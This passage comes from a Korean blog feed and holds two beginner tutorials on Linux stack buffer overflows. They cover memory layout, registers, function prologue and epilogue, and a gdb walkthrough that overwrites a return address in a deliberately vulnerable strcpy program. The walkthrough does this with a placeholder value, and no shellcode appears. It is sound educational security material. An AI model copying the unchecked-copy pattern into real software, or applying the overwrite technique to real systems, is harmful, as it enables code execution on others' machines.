&lt;p&gt;&lt;strong&gt;그누 디버거&lt;/strong&gt; 라는 이름으로 아주 옛부터 널리 쓰이던 디버거 입니다. 앞으로 진행될 내용에서는 이정도 명령어만 알아도 크게 무리 없이 기본적인 분석은 가능하다고 생각 됩니다. &lt;strong&gt;gdb&lt;/strong&gt;는 다양한 명령어가 있으니 상황에 맞게, 취향에 맞게 추가적으로 더 찾아서 쓰시면 되겠습니다. 참고로 괄호안의 문자는 약어입니다.&lt;/p&gt;

&lt;p&gt;그런데 막상 &lt;strong&gt;gdb&lt;/strong&gt;로 이것저것 뒤져보면서 메모리의 주소값을 보다보면 이상하게 뒤죽박죽 매핑된듯 한 느낌을 받습니다.&lt;/p&gt;

&lt;p&gt;이를테면 분명 0xABCD1234의 값이 메모리에는 34 12 CD AB와 같이 보기 불편하게 박혀있습니다. 왜 저럴까요?&lt;/p&gt;

&lt;h1 id=&quot;리틀엔디안빅엔디안&quot;&gt;리틀엔디안/빅엔디안&lt;/h1&gt;

&lt;p&gt;왜 저렇게 보기 귀찮게, 어렵게 저장하고 있냐하면 일종의 메모리 저장 방식 중 하나라고 이해 하시면 됩니다. 특정 데이터를 메모리에 저장할 때 &lt;strong&gt;바이트 단위&lt;/strong&gt;로 저장을 하게 됩니다. 이 때 CPU의 아키텍쳐에 따라 이 바이트의 저장 순서에 따라 &lt;strong&gt;리틀엔디안&lt;/strong&gt;, &lt;strong&gt;빅엔디안&lt;/strong&gt; 또는 두 방식 모두 지원하거나 모두 지원하지 않는 미들엔디안이 있습니다. 여기서는 미들엔디안은 제외 하고 각각의 예를 들어 보도록 하겠습니다. (4바이트)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-3.png&quot; alt=&quot;[그림 2-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;보시는 것처럼 &lt;strong&gt;빅엔디안&lt;/strong&gt;의 경우는 우리가 평소 글을 쓰는 방향과 동일하게 저장됩니다.
반면 &lt;strong&gt;리틀엔디안&lt;/strong&gt;의 경우 이상한 모습이죠. 빅엔디안과는 다르게 데이터가 역순으로 저장 됩니다.&lt;/p&gt;

&lt;p&gt;왜 컴퓨터는 이런 짓 거리를 할까요? CPU에는 &lt;strong&gt;ALU&lt;/strong&gt;라는 산술/연산을 담당하는 친구가 껴있습니다. 이 친구는 메모리를 읽을 때 &lt;strong&gt;낮은 주소&lt;/strong&gt;에서 &lt;strong&gt;높은 주소&lt;/strong&gt;로 읽어들이고 그래야 작업 속도가 빠른 친구입니다. 쉽게 말해 작업 처리를 더 효율적으로 하기위해 설계된 방식입니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;빅엔디안&lt;/strong&gt;의 경우 주로 네트워크 상에서 사용된다 생각하시면 되겠습니다.
우리 주변에 있는 대부분의 데스크톱은 &lt;strong&gt;리틀엔디안&lt;/strong&gt;을 사용하며 Intel 계열의 프로세서인 리눅스, 윈도우가 이에 해당 됩니다. 앞으로 &lt;strong&gt;리틀엔디안&lt;/strong&gt;을 자주 보게 될겁니다.&lt;/p&gt;

&lt;p&gt;추가적로 ARM 프로세서들은 빅엔디안과 리틀엔디안을 선택하여 사용 가능합니다.&lt;/p&gt;

&lt;h1 id=&quot;함수-프롤로그에필로그&quot;&gt;함수 프롤로그/에필로그&lt;/h1&gt;

&lt;p&gt;코드를 몇 번 분석하다 보면 공통적인 모습을 찾을 수 있습니다. (못 보셨을수도 있습니다.)바로 함수의 시작과 끝이 비슷한 모습을 취하고 있다는 것이죠. 왜일까요?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;함수 호출&lt;/strong&gt; 시 동작 방식은 다음과 같이 요약해 봤습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;함수가 사용한 인자를 스택에 저장&lt;/li&gt;
  &lt;li&gt;eip값 즉, 함수 호출후 돌아올 주소를 스택(&lt;strong&gt;ret&lt;/strong&gt;)에 저장 후 함수 시작 지점으로 점프(함수 호출)&lt;/li&gt;
  &lt;li&gt;함수 내에서 사용할 스택 프레임을 설정(&lt;strong&gt;프롤로그&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;함수의 내용 수행&lt;/li&gt;
  &lt;li&gt;수행 후 처음 호출한 지점으로 돌아가기 위해 스택을 복원 (&lt;strong&gt;에필로그&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;호출한 지점의 다음 라인으로 점프 또는 스택에 저장 된 eip값으로 복귀(다음 함수 수행)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;즉, 함수를 수행하기 위한 준비 과정을 &lt;strong&gt;프롤로그&lt;/strong&gt;라 하며 함수 수행을 마무리하는 과정을 &lt;strong&gt;에필로그&lt;/strong&gt;라 이해하면 되겠습니다. 그사이에 실제 코드가 동작 하게는 명령어들이 자리 잡게 됩니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1   #include &amp;lt;stdio.h&amp;gt;
2
3   main(){
4    //프롤로그
5     int num1=1;
6     int num2=3;
7
8     sum(num1,num2); /*sum() 종료후 복귀할 주소를 ret에 저장 
					및 인자값을 스택에 저장 후 sum()으로 점프*/
9          
10     return 0;
11   //에필로그
12  }
13
14  sum(int num1, int num2){
15   //프롤로그       
16    int sum1;
17       
18 		  sum1 = num1 + num2;
19
20    return sum1;
21   //에필로그
22  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위에 코드에서 프롤로그와 에필로그의 대략적인 위치를 보여줍니다. 또한 sum 함수 호출 시의 어떤 동작을 수행 하는지도 간략하게 확인 가능 합니다. 또한 어셉블리어로는 다음과 같이 표현됩니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 프롤로그
1  push    ebp         # 이전 함수의 베이스 주소를 저장(sfp)
2  mov     ebp, esp    # 새로운 스택 프레임 생성

.......생략........

// 에필로그
3  mov     esp, ebp    # 베이스 주소를 이전의 스택으로 복구
4  pop     ebp         # 베이스 주소 복구
5  pop     eip         # eip를 ret에 저장
6  jmp     eip         # 함수 종료 후 다음 명령으로 이동
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;main() 함수 시작 시 프롤로그인 1~2라인이 먼저 수행 됩니다. 그 다음 작성된 코드가 수행 되고 return 값 반환 후에 에필로그 3~6라인이 수행됩니다.&lt;/p&gt;

&lt;p&gt;이 때 3~4 라인은 &lt;strong&gt;leave&lt;/strong&gt;, 5~6라인은 &lt;strong&gt;ret&lt;/strong&gt;라고 표현하기도 합니다.&lt;/p&gt;

&lt;p&gt;간단히 정리 하자면, 함수의 시작점은 프롤로그, 끝점은 에필로그라 생각하시면 됩니다. 그 과정에서 길을 잃지 않기 위해서 위와 같이 ebp와 esp의 조작 과정들을 거치는 것이죠.&lt;/p&gt;

&lt;p&gt;그럼 sfp는 무엇이고, ret는 무엇일까요?&lt;/p&gt;

&lt;h1 id=&quot;bof-맛보기&quot;&gt;BOF 맛보기&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;sfp&lt;/strong&gt;와 &lt;strong&gt;ret&lt;/strong&gt;는 &lt;strong&gt;BOF 맛보기&lt;/strong&gt;와 함께 알아보도록 하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bof1.c
1   #include &amp;lt;stdio.h&amp;gt;
2   
3   int main(int argc, char *argv[]){
4
5      char buf[20];
6      
7      strcpy(buf, argv[1]);
8      printf(&quot;%s\n&quot;, buf);
9
10     return 0;
11  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;버퍼 20을 할당하고 사용자에게 입력값을 받아 버퍼에 저장하는 코드가 보입니다.
메모리에서는 함수가 실행 되면 &lt;strong&gt;4byte 단위&lt;/strong&gt;로 메모리에 버퍼 공간을 확보합니다. 사용자가 임의의 값(AAAA)을 입력했을 때 메모리의 모습은 이런 모습입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-4.png&quot; alt=&quot;[그림 2-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;sfp&lt;/strong&gt;(save frame pointer)는 ebp를 바로 전에 호출한 ebp 주소를 저장해두고 나중에 함수 리턴전에 이 값을 참조하여 ebp를 복구합니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ret&lt;/strong&gt;에서는 함수 종료 후 복귀할 주소가 저장됩니다. 제일 뒤에 있는 파라미터는 필요한 변수의 값들이 들어서게 됩니다.&lt;/p&gt;

&lt;p&gt;여기서 코드 실행 시 일반적으로 사용자가 입력한 값은 버퍼20 영역에 들어가도록 설계가 되었습니다. 하지만 취약한 함수인 &lt;strong&gt;scanf&lt;/strong&gt;, &lt;strong&gt;strcpy&lt;/strong&gt; 등(str…..)을 사용하며, 사용자로부터 &lt;strong&gt;입력받은 값의 길이를 검증하지 않는 경우&lt;/strong&gt; 버퍼를 넘어서 sfp, ret의 영역에 까지 입력값이 저장 됩니다. 이 때 ret영역에 공격 쉘코드로 덮어버리면 공격자의 코드까지 동작되는 것이죠. 예를 들어 “AAAA”*64를 입력 해서 A를 256개를 입력 받았다면 다음과 같이 할당 받은 20byte의 버퍼 공간을 넘어서 저장될 것입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-5.png&quot; alt=&quot;[그림 2-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;대충 감이 오시나요??
주어진 버퍼의 길이 이상의 데이터를 입력하여 sfp, ret 영역까지 덮고 함수 종료 후 ret영역의 코드가 실행되어 공격자가 원하는 행위를 하도록 하는 공격인 것이죠. 실제로는 아래와 같이 공격 페이로드를 작성해서 BOF를 시도 합니다. 우리가 노리는건 256바이트 무의미한 덩어리가 아닙니다.(물론 dos 공격의 개념으로 사용 가능합니다.) 우리는 ret 영역에 shell을 따낼수있는 코드를 구성하는 것입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-6.png&quot; alt=&quot;[그림 2-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이제부터는 앞에서 봤던 코드를 대상으로 &lt;strong&gt;BOF&lt;/strong&gt; 시도해 봅시다. 우리 목표는 위의 그림과 마찬가지로 ret 영역에 HACK를 넣는겁니다. 주의 할 점은 코드내에서 버퍼를 20byte를 주었다 해도 실제 메모리상에서는 그 이상을 할당할 수도 있습니다. 반드시 gdb를 통해서 실제 할당 공간을 확인해야 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-7.png&quot; alt=&quot;[그림 2-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위에서 봤던 bof.c 코드를 작성 후 컴파일 해야 합니다. 컴파일된 바이너리 파일을 실행하여 정상적으로 동작이 되는지까지 확인 합시다. 동작은 아래와 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;bof.c의 7번 라인에서 입력 받은 argv의 값을 &lt;strong&gt;strcpy&lt;/strong&gt; 함수를 통하여 buf에 복사&lt;/li&gt;
  &lt;li&gt;bof.c의 8번 라인에서 buf에 복사된 입력값을 &lt;strong&gt;printf&lt;/strong&gt; 함수를 통하여 출력&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;정상적으로 동작되는 것을 확인 했습니다. 이제 gdb를 사용해서 바이너리 파일 bof1을 뜯어 보도록 합시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-8.png&quot; alt=&quot;[그림 2-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;gdb로 bof1 바이너리 파일을 실행 시키고 &lt;strong&gt;disassemble&lt;/strong&gt; 명령어를 통해 main 함수를 어셈블리어로 출력 해줍니다. 하지만 코드를 읽기에 익숙하지 않은 형태입니다. gdb는 기본적으로 at&amp;amp;t 형식을 표현합니다. 이걸 intel 형식으로 바꿔서 우리가 읽기 편하게 바꿔 봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-9.png&quot; alt=&quot;[그림 2-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;보기 편한 형태로 보시면 됩니다. 참고로 다시 at&amp;amp;t 형식으로 바꾸는 방법은 &lt;strong&gt;set disassembly-flavor att&lt;/strong&gt; 입니다. 계속 진행 해보겠습니다. 위에서 짚고 넘어갔던 프롤로그/에필로그와 전 편에서 다뤘던 어셈블리 명령어, 레지스터 등이 보입니다.&lt;/p&gt;

&lt;p&gt;여기서 중요시 봐야할 라인은 버퍼의 크기를 정하는 &lt;strong&gt;main+3&lt;/strong&gt; 라인입니다. 프롤로그 후에 필요한 버퍼 크기만큼 할당하여 esp를 쭉 밀어 넣는다고 생각하시면 됩니다. 하지만 앞서 말했듯이 우린 20byte를 지정 했지만 실제로는 0x28 즉, 40byte를 할당 받았습니다. 이 유는 컴파일러마다의 차이라고 하시면 되겠습니다. 중요한 것은 할당받은 버퍼공간을 꼭 항상 확인해야 한다는 겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-10.png&quot; alt=&quot;[그림 2-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;지금까지 확인 된 내용은 위의 그림과 같습니다. 40byte의 버퍼와 sfp, ret 각 4byte 입니다. 그럼 이제 버퍼에 값이 정말 들어가는지 봐야겠습니다. main+31 라인은 strcpy 함수를 호출하는 라인입니다.  우리가 입력값이 저장되어있는 argv의 값을 buf에 복사하기 전입니다. 그 다음 라인 36,39 라인은 esp를 정리하는 라인이며 42라인에서 ebp를 eax에 저장하는 과정을 확인 가능합니다. 버퍼에 입력한 값들이 들어 가는지 확인해 봅시다.&lt;/p&gt;

&lt;p&gt;잊지 말아야 하는 점은 버퍼 다음 sfp 다음 ret 영역이 자리 잡는 다는 겁니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-11.png&quot; alt=&quot;[그림 2-11]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위의 사진과 같이 브레이크 포인트를 main+42 지점에 설정 해줍시다. 그리고 run 명령어를 통해서 bof1이 실행 되며, python의 -c 옵션과 print함수를 사용하여 입력값을 전달됩니다. 미리 설정한 브레이크 포인트에서 멈췄다는걸 보여줍니다. 이제 esp를 기준으로 특정 크기만큼의 메모리 상태를 확인하여 버퍼 구역에 값이 똑바로 들어갔는지 확인합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-12.png&quot; alt=&quot;[그림 2-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;검정색으로 덮혀있는 40byte가 버퍼 구역임을 확인할 수 있습니다. 버퍼 다음엔 sfp 구역이며 이어서 ret 구역이 자리잡는다고 알려 드렸습니다. 다음의 사진을 통해 ebp의 위치를 확인 하여 붉은 박스가 sfp 영역인지 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-13.png&quot; alt=&quot;[그림 2-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;ebp의 위치와 저장되있는 값을 확인해보니 붉은 박스가 sfp 영역임을 확인 헀습니다. 그럼 초록 박스는 ret구역이라는 것을 알 수 있습니다. 계속 해서 continue 명령을 사용해 나머지 부분을 실행 시킵니다. 입력한 “A” 40byte가 똑바로 출력 됩니다. 그렇다면 추가로 4byte를 입력하여 sfp구역의 EBP값을 넘어간 후 추가적으로 4byte를 입력 한다면 ret 위치에 저장 될 것입니다. 바로 확인 해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x02/0x02-14.png&quot; alt=&quot;[그림 2-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;sfp 위치에 BBBB의 아스키 값이 저장 되있고, 우리의 타겟이었던 ret 구역(초록 박스)에 “HACK” 문자의 아스키 값이 잘 저장 되어있네요. 이로써 ret 구역에 값이 저장 되며 이를 악용해 쉘코드를 저 위치에 저장 하면 됩니다.&lt;/p&gt;

&lt;p&gt;즉, 40byte(buffer) + 4byte(sfp)의 잉여 데이터를 채우고 ret에 공격 쉘코드를 읽을수 있는 주소값으로 바꾸면 함수 종료 후 ret에 저장된 주소값을 참조하며 쉘코드가 실행 됩니다.&lt;/p&gt;

&lt;p&gt;지금 까지는 맛보기 BOF였습니다. 이것 저것 한 번에 알려 드려서 양이 많아졌네요. 공부 하면서 중구난방으로 있던 내용들을 무리해서라고 꽉꽉 채웠습니다. 최대한 간단하게…&lt;/p&gt;

&lt;p&gt;다음 시간에는 직접 쉘코드를 활용해서 실제 쉘을 따보겠습니다.
갈 길이 멉니다….천천히 탄탄히 갑시다.&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x02 - Buffer Overflow 맛보기</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">linux_0x01</title>
      <link href="/linux_0x01" rel="alternate" type="text/html" title="linux_0x01" />
      <published>2019-02-18T19:18:00+09:00</published>
      <updated>2019-02-18T19:18:00+09:00</updated>
      <id>/linux_0x01</id>
      <content type="html" xml:base="/linux_0x01">&lt;h2 id=&quot;0x01---buffer-overflow-준비&quot;&gt;0x01 - Buffer Overflow 준비&lt;/h2&gt;

&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다. 오늘부터 본격적으로 &lt;strong&gt;BOF&lt;/strong&gt;에 알아보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;BOF&lt;/strong&gt;(Buffer Overflow)란 &lt;strong&gt;메모리&lt;/strong&gt;의 동작 과정중의 오류로 인한 잘못된 동작을 유도하는 취약점입니다. 프로세스가 데이터를 &lt;strong&gt;버퍼&lt;/strong&gt;에 저장 시 입력 값의 크기를 검증하지 않을 경우 주어진 버퍼를 넘어선 즉, 지정된 위치가 아닌 곳에 저장되며 인접한 메모리를 덮어 쓰게 됩니다. 인접 메모리에는 기존의 데이터가 저장되어 있으며 &lt;strong&gt;변수, 프로세스 흐름 제어&lt;/strong&gt; 등의 데이터가 포함됩니다. 따라서 메모리 접근 오류로 인한 이상 동작을 하게되며 결과적으로 취약점으로 동작하게 되는것입니다.&lt;/p&gt;

&lt;p&gt;앞으로 이 BOF에 대해서 천천히 알아보고자 합니다. 먼저 BOF를 알기 위해서는 메모리, 레지스터 등의 구조 및 개념과 앞으로 사용될 gdb의 사용법 등 본격적인 시작에 앞 서 필요한 배경 지식에 대하여 짚고 넘어가도록 하겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;메모리-구조&quot;&gt;메모리 구조&lt;/h2&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x01/0x01-1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 BOF를 알기 위해선 메모리를 알아야 합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Kernel&lt;/strong&gt; : OS의 중요 코드들이 로드되며 일반 사용자는 접근 불가한 영역&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;off-limit&lt;/strong&gt; : 사용자의 Kernel 접근을 막기 위해 설정한 영역&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Stack&lt;/strong&gt; : 환경변수, 파라미터, 반환되는 주소 및 지역변수 등 임시적인 데이터를 저장하는 공간이며, 높은 메모리 주소에서 낮은 메모리 주소로 저장됨&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;libc&lt;/strong&gt; : 프로그램 내부에서 사용하는 라이브러리 함수들과 관련된 공유 라이버리 파일이 정장되는 공간&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Heap&lt;/strong&gt; : 엉덩…아니 필요에 의해 사용되는 동적 변수의 데이터가 저장되는 공간이며, 낮은 메모리 주소에서 높은 메모리 주소로 저장됨&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;BSS / Data&lt;/strong&gt; : 전역변수, 정적변수, 배열, 구조체 등이 저장되는 구조이며 차이는 아래와 같다
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;BSS&lt;/strong&gt; : 초기화 되지 않은, 0으로 초기화, Null로 초기화된 데이터의 경우 저장되는 공간&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Data&lt;/strong&gt; : 초기화 된 데이터가 저장 되는 공간&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Code&lt;/strong&gt; : 실제로 실행되는 hex, bin과 같은 파일내부에 실행되는 코드들이 저장되며 기계어 명령어, 어셈블리 코드가 실행되는 영역&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;메모리를 간단하게 정리한 내용입니다. 여기서 Stack과 Heap의 동작 방향이 다르다는 것이 특이한 모습을 보입니다. 왜 그럴까요?&lt;/p&gt;

&lt;p&gt;바로 효율적인 메모리 관리와 Kernel영역의 보호를 위해 저런 모습으로 설계 되었습니다. Stack은 Kernel의 반대 방향으로 움직이고 Stack과 Heap 사이에 libc를 배치하여 메모리 관리의 효율성을 높인것이죠.&lt;/p&gt;

&lt;p&gt;이제 메모리를 간단히 알아 보았으니 메모리 중 Stack에 관하여 간단히 짚고 넘어가도록 하겠습니다.&lt;/p&gt;

&lt;h2 id=&quot;stack&quot;&gt;Stack?&lt;/h2&gt;

&lt;p&gt;Stack의 역할은 위에서 언급했으니 패스하고 동작 장식에 대하여 알아 보도록 하겠습니다. Stack은 기본적으로 &lt;strong&gt;후입선출&lt;/strong&gt;(LIFO, Last in First out)의 방식으로 동작합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x01/0x01-2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Stack의 동작은 위와 같습니다. 16byte의 Stack공간에 A(4byte) 데이터를 저장시 PUSH를 통하여 저장합니다. 밀어 넣는다는 거죠. 이 때 ESP -4 즉, 스택 포인터의 값을 총값에서 -4값을 저장 해둡니다. 왜일까요?&lt;/p&gt;

&lt;p&gt;Stack은 메모리의 높은 주소값에서 낮은 주소값으로 이동하기 떄문에 16byte 에서 4byte씩 줄이는 것이죠. 높은 곳에서 낮은 곳으로.&lt;/p&gt;

&lt;p&gt;다음으로 B 데이터를 저장시 마찬가지로 PUSH를 통하여 A데이터 위에 밀어 넣게 됩니다. ESP 값 또한 -4의 값을 저장 합니다. C 데이터까지 같은 방식으로 데이터를 저장 합니다. 그런데 다시 A 데이터를 빼고 싶다면?&lt;/p&gt;

&lt;p&gt;앞서 말했던 Stack의 동작 방식인 &lt;strong&gt;후입선출&lt;/strong&gt;에 의해 C 데이터를 POP을 통하여 뽑고 ESP의 값은 -4가 아닌 +4의 값을 저장합니다. 이어서 B데이터를 뽑은 후 A 데이터를 뽑을 수 있습니다. 이것이 Stack의 동작 방식인 후입선출입니다.&lt;/p&gt;

&lt;p&gt;정리하자면, Stack은 &lt;strong&gt;메모리의 높은 주소값에서 낮은 주소값으로 데이터가 저장&lt;/strong&gt;되며 동작 방식은 &lt;strong&gt;후입선출&lt;/strong&gt;의 방식으로 동작 합니다. 위에서 나온 ESP의 경우 레지스터의 한 종류로서 레지스터는 포인터, 산술 연산, 인덱스, 세그먼트, 플래그 등이 있으며 필요한 몇가지의 레지스터만 간단하게 정리하자면 다음과 같습니다.&lt;/p&gt;

&lt;p&gt;포인터 레지스터 : 포인터와 관련된 레지스터&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;EIP&lt;/strong&gt; (Instruction Pointer) : CPU가 실행할 다음 명령어의 주소값을 나타냄&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EBP&lt;/strong&gt; (Base Pointer) : 현재 스택의 최하단 주속값을 나타냄, EBP의 다음 주소는 Return값을 나타냄&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ESP&lt;/strong&gt; (Stack Pointer) : 현재 스택의 최상단 주소값을 나타냄&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;산술 연산 레지스터 : 산술 논리 연산에 필요한 레지스터&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;EAX&lt;/strong&gt; (Accumulator Register) : 산술 논리 연산에 필요한 상수 또는 변수값이 저장되며 함수의 리턴값 저장&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ECX&lt;/strong&gt; (Counter Register) : 반복문 동작시 반복문의 반복 횟수를 저장&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EDX&lt;/strong&gt; (Data Register) : EAX 레지스터를 보조&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;인덱스 레지스터 : 작업에 필요한 데이터의 주소값 저장에 사용되는 레지스터&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ESI&lt;/strong&gt; (Source Index) : 데이터 복사 및 조작할 때 사용하는 데이터 주소를 저장(ESI &amp;lt;&amp;gt; EDI)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;EDI&lt;/strong&gt; (Destination Index) : 데이터 복사시 목적지의 주소 저장 (EDI &amp;lt;&amp;gt; ESI)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;레지스터의 사용 이유는 CPU의 빠른 작업 처리를 위해 사용 됩니다. CPU내부에 위치하여 메모리에 접근하는 것보다 더욱 빠른 속도로 접근 가능합니다. 단, 별도의 데이터를 저장 하기엔 용량이 작기에 위에서 알아본 특수한 목적에 맞는 특정 데이터만 저장해두며 CPU의 빠른 동작을 지원 해줍니다.&lt;/p&gt;

&lt;p&gt;레지스터의 종류는 위의 내용 외 더욱 다양한 레지스터가 존재 하지만 현재 필요한 레지스터 및 알아두면 좋을 레지스터를 알아 보았습니다. 급하게 외우기보단 반복적으로 사용하다 보면 필요한 레지그터의 값만 빠르게 살펴보고 자연스럽게 기억이 되실겁니다.&lt;/p&gt;

&lt;p&gt;마지막으로 어셈블리어 명령어에 대하여 알아보도록 하겠습니다. 위에서 Stack의 후입선출의 동작 방식을 알아보는 과정 중 PUSH, POP 그리고 언급은 없었지만 NOP라는 단어가 보였습니다. 이 단어들이 어셈블리어의 명령어이며, 어셈블리어란 컴퓨터 프로그래밍의 저급 언어입니다. 쉽게 말해 컴퓨터가 알아먹기 쉽도록 구성된 언어입니다. 다양한 명령어가 있으며 여기서도 필요한 또는 알아두면 나중에 좋을만한 내용들만 알아보도록 하겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PUSH&lt;/strong&gt; : 데이터를 스택에 쌓음&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;POP&lt;/strong&gt; : 스택의 저장된 데이터를 뽑음&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;NOP&lt;/strong&gt; : 아무 동작 안함&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;MOV&lt;/strong&gt; : 데이터 이동&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CALL&lt;/strong&gt; : 특정 주소의 함수를 호출, JMP와 같이 실행의 흐름이 변경되지만 호출된 함수의 동작이 종료되면 돌아갈 리턴 주소를 Stack에 저장해 둔다는 차이점이 있음&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;JMP&lt;/strong&gt; : 특정 주소의 함수로 이동하며 JMP 외의 다양한 조건 점프 명령어가 있음&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ADD&lt;/strong&gt; : 덧셈 명령을 수행&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SUB&lt;/strong&gt; : 뺄셈 명령을 수행&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;위의 리스트 외에도 곱셈, 나눗셈, AND, OR, XOR 연산 및 조건 분기 등 다양한 기능의 명령어들이 존재 합니다. 이 명령어들 또한 레지스터들과 함께 자연스럽게 익혀 나가시면 됩니다.&lt;/p&gt;

&lt;p&gt;다음 포스트에는 간단한 BOF 공격과 공격에 필요한 내용들을 추가적으로 정리해보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;천천히 갑시다. 조바심 내지 말고 천천히 탄탄하게.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x01 - Buffer Overflow 준비</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">linux_0x00</title>
      <link href="/linux_0x00" rel="alternate" type="text/html" title="linux_0x00" />
      <published>2019-02-08T19:18:00+09:00</published>
      <updated>2019-02-08T19:18:00+09:00</updated>
